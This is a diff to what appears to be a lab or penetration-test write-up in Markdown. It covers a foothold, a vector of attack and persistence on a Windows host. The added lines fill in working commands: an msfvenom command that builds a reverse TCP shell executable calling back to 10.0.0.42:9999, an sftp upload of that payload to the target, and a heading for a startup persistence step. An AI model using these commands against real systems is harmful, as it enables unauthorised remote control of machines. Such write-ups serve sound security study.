@@ -24,16 +24,16 @@ tyronne's environment was already modified:
 
 ## Vector of Attack
 
-![[/z.attachments/Pasted image 20250611172051.png]]
+![](../z.attachments/Pasted%20image%2020250611172051.png)
 
 ## Foothold
 
 
-![[../z.attachments/Pasted image 20250611164942.png]]
+![](../z.attachments/Pasted%20image%2020250611164942.png)
 
 Testing foothold
 ```
-ssh tyronne@ip
+ssh tyronne@192.168.1.100
 ```
 
 ## Creating persistence
@@ -42,12 +42,12 @@ ssh tyronne@ip
 
 Create reverse shell
 ```
-msfvenom create .exe
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.0.0.42 LPORT=9999 -f exe -o reverseshell.exe
 ```
 
 Insert Payload
 ```
-sftp tyronne@192.168.1.100 <<< $'put file.exe
+sftp tyronne@192.168.1.100 <<< $'put reversehell.exe
 ```
 
 Create startup command
